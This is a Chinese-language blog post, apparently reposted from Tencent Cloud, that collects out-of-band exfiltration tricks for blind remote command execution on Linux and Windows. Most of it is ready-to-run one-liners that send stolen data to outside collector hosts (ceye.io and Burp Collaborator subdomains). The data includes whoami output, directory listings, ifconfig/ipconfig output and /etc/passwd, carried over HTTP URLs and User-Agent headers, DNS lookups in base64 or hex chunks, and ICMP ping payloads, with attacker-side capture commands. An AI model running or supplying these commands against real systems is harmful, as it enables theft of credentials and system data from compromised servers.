---
title: "带外攻击OOB（RCE无回显骚思路总结）"
date: 2024-10-31
description: ""
tags: []
categories: ["${folder}"]
---

**基本概念**
--------

### **1.带内攻击**

向服务器提交一个 payload，而服务器响应给我们相关的 response 信息。大家都叫它带内攻击，这些理论的东西，我们简单理解就好，这里我们就理解成**单挑通信的通道为带内攻击，也就是整个测试过程或者说是交互过程，中间没有其外部的服务器参与，只有自己和目标服务器，那么就叫带内**。

### **2.带外攻击（OOB）**

**服务器用来测试盲的各种漏洞的话，则需要我们外部的独立服务器参数，也就是带入了外部的服务器，我们叫它带外攻击。**这里简单的提了一下这个带内和带外，我们只要理解其过程即可。

### **3.带外数据**

传输层协议使用带外数据（out-of-band，OOB）来发送一些重要的数据，如果通信一方有重要的数据需要通知对方时，协议能够将这些数据快速地发送到对方。为了发送这些数据，协议一般不使用与普通数据相同的通道，而是使用另外的通道。linux系统的套接字机制支持低层协议发送和接受带外数据。但是TCP协议没有真正意义上的带外数据。为了发送重要协议，TCP提供了一种称为紧急模式（urgent mode）的机制。TCP协议在数据段中设置URG位，表示进入紧急模式。接收方可以对紧急模式采取特殊的处理。很容易看出来，这种方式数据不容易被阻塞，并且可以通过在我们的服务器端程序里面捕捉SIGURG信号来及时接受数据。这正是我们所要求的效果。

由于TCP协议每次只能发送和接受带外数据一个字节，所以，我们可以通过设置一个数组，利用发送数组下标的办法让服务器程序能够知道自己要监听的端口以及要连接的服务器IP/port。由于限定在1个字节，所以我们最多只能控制255个port的连接，255个内网机器（不过同一子网的机器不会超过255J），同样也只能控制255个监听端口，不过这些已经足够了。

### **4.盲**

**程序不进行详细的回显信息，而只是返回对或者错时，我们都可以叫它盲**。我们在做渗透测试的时候，经常会遇到这种情况，测试跨站可能有些功能插入恶意脚本后无法立即触发，例如提交反馈表单，需要等管理员打开查看提交信息时才会触发，或者是盲注跨站，盲打 XSS 这种。再例如 SSRF，如果程序不进行回显任何信息，而只提示你输入的是否合法，那么也无法直接判断程序存在 SSRF 漏洞，我们可以叫盲 SSRF。再例如 XXE，引入外部文件时，如果程序也不返回任何信息和引用文件的内容，而只提示输入的是否有误，那么也无法直接判断程序是否存在 XXE 漏洞，我们也可以叫盲 XXE。

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/001.png)

**基本回显思路**
----------

### **1.对于出网机器**

####   **使用http传输，如wget，curl，certutil将回显信息爬出**

   **1.1 优点：**

方便，回显全。

   **1.2 缺点：**

对于不出网服务器没有办法传输，同时需要了解其返回包字段信息，需要使用返回包字段将回显信息带出

### **2.对于不出网机器**

####   **使用DNS传输，ICMP传输，powershell中的wget，curl等传输**

    **2.1 优点：**

不出网机器可以传输

    **2.2 缺点：**

1.回显是一条条执行，需要将回显结果拼接解码，回显信息比较麻烦

          2.短回显可以使用DNS传输，长回显大部分带出需要powershell搭配，但杀毒软件往往禁用powershell，因此利用条件较苛刻

### **3.在线网站DNS/HTTP管道解析**

经常在拿下shell的时候碰到命令执行无回显的情况，因此为了解决命令执行无回显时，可以借助DNS管道解析来让命令回显

登录**ceye.io**

> 各操作系统的使用方法：<https://www.freesion.com/article/3526121510/>

#### **HTTP带外攻击**

linux可以使用以下方法：

**1.curl**

通过curl远程命令执行RCE去对靶机执行以下命令





```text-plain
通过http记录查看是否执行（最好执行两次），curl走http协议
curl http://ip.port.XXXXXX.ceye.io/`whoami`
curl `whoami`.XXXXXX.ceye.io
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/002.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/003.png)

**2.sed**

**如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的**





```text-plain
curl http://ip.port.XXXXXX.ceye.io/`ls -al|sed -n '2p'`
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/004.png)

**使用base64传输**





```text-plain
curl http://ip.port.XXXXXX.ceye.io/`ls -al|sed -n '2p'|base64`   
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/005.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/006.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/007.png)

#### **DNS带外攻击**

**通过DNS记录查看是否执行（最好执行两次），ping走的是DNS协议**





```text-plain
ping `whoami`.ip.port.XXXXXXX.ceye.io
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/008.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/009.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/010.png)

**说明使用DNS管道解析还是比较鸡肋的，只适合单条的短信息回显，有点作用。**

DNS管道解析的扩展，结合php命令执行可以使用这种方式进行回显，使用sed命令令回显变长：

执行:





```text-plain
http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al`
```

结果：http://snrkgl.ceye.io/total

看起来只能带出第一行，所以我们需要sed命令





```text-plain
http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al | sed -n '2p'`
```

结果：http://XXXXXX.ceye.io/drwxr-xr-x

发现空格不能被带出来，用base64编码





```text-plain
解码：http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al | sed -n '2p'|base64`
```

结果：http://XXXXXX.ceye.io/ZHJ3eHIteHIteCAyIHJvb3Qgcm9vdCA0MDk2IERlYyAyNyAxNDo1OSAuCg==





```text-plain
解码：drwxr-xr-x 2 root root 4096 Dec 27 14:59 .
```

若有的时候长度太大，cut来分割字符(第一个字符下标为1)





```text-plain
http://xxx.xxx.xxx.xxx/test.php?cmd=curl http://XXXXXX.ceye.io/`ls -al |cut -c 3-10`
```

### **4.burpsuit Collaborator Client模块回显（带外攻击OOB）**

打开 collaborator client

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/011.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/012.png)

利用远程命令执行，或直接在靶机上执行命令：意思是发送whoami信息回显至burp的二级域名地址，回显过来

#### **1.第一种命令格式**

**通过DNS记录查看是否执行（最好执行两次），ping走的是DNS协议**





```text-plain
curl `whoami`.wyyysg1fi9svq8zgf0g11dz80z6pue.burpcollaborator.net
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/013.png)

**查看burp模块，DNS隧道解析结果**

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/014.png)

**http隧道回显信息**

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/015.png)

#### **2.第二种命令格式**





```text-plain
curl http://n7vp17a6r01mzz87orpsa48z9qfh36.burpcollaborator.net/`whoami`
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/016.png)

#### **DNS记录中无回显**

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/017.png)

#### **http中有回显**

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/018.png)

#### **3.第三种命令执行格式**

linux系统：





```text-plain
ping `whoami`.ip.port.ttq72fceob0yxwq9342c4yuo2f85wu.burpcollaborator.net
```

windows系统：





```text-plain
ping %whoami%.ip.port.ttq72fceob0yxwq9342c4yuo2f85wu.burpcollaborator.net
```

* * *

**Linux的应用**
------------

### **1.http传输**

####  **1.1 wget传输**

**使用wget将命令回显信息通过包头数据字符串User-Agent传输至攻击服务器上，xargs echo–n代表去掉各个分隔符，换行符等符号输出**





```text-plain
wget --header="User-Agent: $(cat /etc/passwd | xargs echo–n)" http://6rych16irk3064ztjoo9ufasuj0do2.burpcollaborator.net
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/019.png)

####  **1.2 curl传输：curl也是一个利用思路，套路差不多，比较简单不再测试**

### **2.DNS传输**

####  **2.1通过base64编码传输**

**base64编码传输**





```text-plain
var=11111 && for i in $(ifconfig|base64|awk '{gsub(/.{50}/,"&\n")}1'); do var=$((var+1)) && nslookup $var.$i.402c35vpn9hpplp9ilj09pxx9ofe33.burpcollaborator.net; done
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/020.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/021.png)

**每行记录，再base64解密**

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/022.png)

拿到机器ifconfig命令执行记录，部分会乱码

####   **2.2 十六进制传输：（hex编码）**





```text-plain
var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig $var.$b.itfjy788hafvu4q8xtf7naktrkxbpze.burpcollaborator.net; done
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/023.png)

这种方式需要每条结果复制粘贴，比较麻烦，但回显结果还是准确的，可以看到ifconfig命令执行后的直接结果 

> **十六进制转换字符：**<http://www.bejson.com/convert/ox2str>

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/024.png)

#### **2.3 ICMP传输**





```text-plain
linux
靶机
cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 easn1l1elxy8t7azlztz02gkbbh65v.burpcollaborator.net;done
攻击者
sudo tcpdump 'icmp and src host 202.14.120.xx' -w icmp_file.pcap#To capture
攻击者提取数据
echo "0x$(tshark -n -q -r icmp_file.pcap -T fields -e data.data | tr -d '\n' | tr -d ':')" | xxd -r -p   #Or Use Wireshark gui
```

* * *

**Windows的应用**
--------------

### **1.http传输**

####  **1.1 curl传输**





```text-plain
windows中 %xxx% 的xxx代表系统变量,常用系统变量命令
              %SystemDrive%                                     系统安装的磁盘分区
              %SystemRoot% = %Windir% WINDODWS                  系统目录
              %ProgramFiles%　                                  应用程序默认安装目录
              %AppData%                                         应用程序数据目录
              %CommonProgramFiles%                              公用文件目录
              %HomePath%                                        当前活动用户目录
              %Temp% =%Tmp%                                     当前活动用户临时目录
              %DriveLetter%                                     逻辑驱动器分区
              %HomeDrive%                                       当前用户系统所在分区
```

**curl抓取用户名：//**%USERNAME%，列出所有用户名





```text-plain
curl http://0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net/%USERNAME%
```

**curl获取windows安装目录：**//%WinDir%，列出windows的安装目录





```text-plain
curl http://0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net/%WinDir%
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/025.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/026.png)

查看远程username名称结果为Butcher

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/027.png)

#### **1.2 certutil利用**

**payload逻辑**

将ipconfig的结果记录在新建temp文件中，再对temp文件进行base64加密变成temp2文件，再对temp2文件中的多余字符"CERTIFICATE"删掉变成temp3，再对temp3的内容删除换行符生成所有数据只在一行的temp4（因为http响应包想要信息全部输出必须使信息全在一行），并把temp4的内容赋予变量为p1，最后使用curl爬取p1的值赋予http响应包的User-Agent字段输出于http:// qysvrrmxvestl2c93ydg0u5p1g76vv.burpcollaborator.net中，最后删除本地文件夹中所有生成的带有temp字段的文件（也就是之前生成的temp~temp4四个文件）





```text-plain
ipconfig > temp && certutil -f -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && (for /f %i in (./temp3) do set /p=%i<nul >>temp4) || set /p pl=<temp4 && curl -H "User-Agent:%pl%" http://qysvrrmxvestl2c93ydg0u5p1g76vv.burpcollaborator.net && del temp*
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/028.png)

**执行成功**

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/029.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/030.png)

**Base64解码即可看到执行结果**

### **2.DNS传输**

#### **2.1 dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）**





```text-plain
for /L %i in (1,1,10) do nslookup    //执行10次nslookup命令
cmd /v /c "hostname > temp && certutil -f -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && set /p MYVAR=<temp3 && set FINAL=!MYVAR!.z00h57chzl8lln3fno9aydnspjv9jy.burpcollaborator.net && nslookup !FINAL!"
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/031.png)

经过测试，回显只能执行hostname命令，没有办法通过写入对命令shell的循环来让其执行多次回显信息，失败。

#### **2.2 十六进制传输：（hex）--缺点：必须调用powershell**

**payload逻辑：**





```text-plain
whoami > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.qf95nhvxs08z5nr9wk19ruzsqjw9ky.burpcollaborator.net';$j += 1; nslookup $fin }
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/032.png)

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/033.png)

第二串字符

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/034.png)

两个拼接起来





```text-plain
0a627574636865725c627574636865720d
```

> 十六进制转字符转换：<http://www.bejson.com/convert/ox2str>

转后为信息是全的，可以全部一条条来，最后全部破解即可

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/035.png)

#### **2.3 通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录**

**使用windows的win+r调出运行，再执行第二行代码，会调用DNS解析**





```text-plain
win+r
\\%USERNAME%.0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net
```

![](/images/posts/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/036.png)

### **3.ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）**

payload逻辑：





```text-plain
whoami > output.txt && powershell $text=Get-Content output.txt;$ICMPClient = New-Object System.Net.NetworkInformation.Ping;$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;$PingOptions.DontFragment = $True;$sendbytes = ([text.encoding]::ASCII).GetBytes($text);$ICMPClient.Send(' edvhr84xv7p1ga18aoiwl0mmzd54tt.burpcollaborator.net',60 * 1000, $sendbytes, $PingOptions);
```


原文链接：[带外攻击OOB（RCE无回显骚思路总结）](https://cloud.tencent.com/developer/article/1956480)
